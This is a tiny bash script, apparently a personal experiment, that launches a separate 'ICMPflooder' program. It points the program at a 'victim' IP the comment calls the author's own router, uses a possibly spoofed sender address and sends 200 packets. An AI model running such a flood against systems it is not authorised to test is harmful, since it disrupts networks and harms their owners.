#!/usr/bin/env bash
#runs the flooder with hardcoded settings
victim_ip=192.168.0.1 #my router IP
sender_ip=192.168.0.133 #? fake sender IP?
number_of_packets_to_sent=200

./ICMPflooder  $sender_ip $victim_ip $number_of_packets_to_sent
